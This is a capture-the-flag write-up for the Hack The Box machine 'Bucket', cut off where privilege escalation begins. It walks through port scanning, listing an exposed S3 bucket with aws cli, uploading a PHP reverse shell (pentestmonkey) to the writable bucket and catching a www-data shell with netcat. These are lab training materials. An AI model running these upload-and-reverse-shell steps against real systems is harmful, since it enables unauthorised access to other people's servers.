---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: 
---

<br />

![1](../../../assets/images/Bucket/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Introduction:

<br />



<br />

# Enumeration:

<br />

We start by running the typical `nmap` scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.10.212 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 19:33 CEST
Nmap scan report for 10.10.10.212
Host is up (0.041s latency).
Not shown: 65221 closed tcp ports (reset), 312 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://bucket.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.65 seconds
```

<br />

Open Ports:

- `Port 22` -> ssh

- `Port 80` -> http

<br />

# Http Enumeration: -> Port 80

<br />

Visiting the website returns a `302 found` status code, redirecting to `bucket.htb`.

So, we add it to the `/etc/hosts` and list again:

<br />

![2](../../../assets/images/Bucket/2.png)

<br />

The page is completely `static` and doesn't have any function, only some hacking articles, but inspecting the `source code` we found something:

<br />

![3](../../../assets/images/Bucket/3.png)

<br />

## Amazon S3 Bucket:

<br />

It's an `Amazon S3 Bucket` subdomain!!

The site uses a bucket to `store` the images of the articles we saw earlier and most likely the rest of its `resources` as well.

<br />

![4](../../../assets/images/Bucket/4.png)

<br />

When we access the base URL, it shows the typical `"status: running"` message:

<br />

![5](../../../assets/images/Bucket/5.png)

<br />

If we do some `research` on Google we can discover how to `enumerate` a bucket with `aws cli`.

To do it, the first thing, is to `configure` this tool:

<br />

```bash
❯ aws configure
AWS Access Key ID [None]: test
AWS Secret Access Key [None]: test
Default region name [None]: us-east-1
Default output format [None]: test
```

<br />

Now we can start enumerating the available `buckets`:

<br />

```bash
❯ aws s3 ls s3:// --endpoint-url=http://s3.bucket.htb
2025-04-11 20:28:03 adserver
```

<br />

There is only one bucket on this server called `"adserver"`.

With the following command, we can see its contents:

<br />

```bash
❯ aws s3 ls s3://adserver --endpoint-url=http://s3.bucket.htb
                           PRE images/
2025-04-11 20:30:04       5344 index.html
```

<br />

And if we add the `--recursive` flag, we can see the files inside the `"images"` directory:

<br />

```bash
❯ aws s3 ls s3://adserver --endpoint-url=http://s3.bucket.htb --recursive
2025-04-11 20:32:03      37840 images/bug.jpg
2025-04-11 20:32:03      51485 images/cloud.png
2025-04-11 20:32:04      16486 images/malware.png
2025-04-11 20:32:04       5344 index.html
```

<br />

Cool, we have `access` to the bucket and we can `list` it contents.

What if we try to `upload` something?

<br />

```bash
❯ echo "This is a test to probe if we have write permissions in this bucket :D" > test.txt
❯ aws s3 cp test.txt s3://adserver/test.txt --endpoint-url=http://s3.bucket.htb
upload: ./test.txt to s3://adserver/test.txt
```

<br />

Yes! We can upload files!

<br />

![6](../../../assets/images/Bucket/6.png)

<br />

At this point, we can try to upload a `malicious` php reverse shell and if the website allows php `execution`, gain access to the victim machine.

To do it, we can use the `php` reverse shell of [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) GitHub repository:

<br />

```bash
❯ aws s3 cp reverseshell.php s3://adserver/reverseshell.php --endpoint-url=http://s3.bucket.htb
upload: ./reverseshell.php to s3://adserver/reverseshell.php
```

<br />

Now we load the `reverse shell` page and check the listener:

<br />

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.212] 33860
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:06:02 up  1:41,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<br />

Perfect! We are in as `www-data`!

<br />

# Privilege Escalation: www-data -> roy

<br />
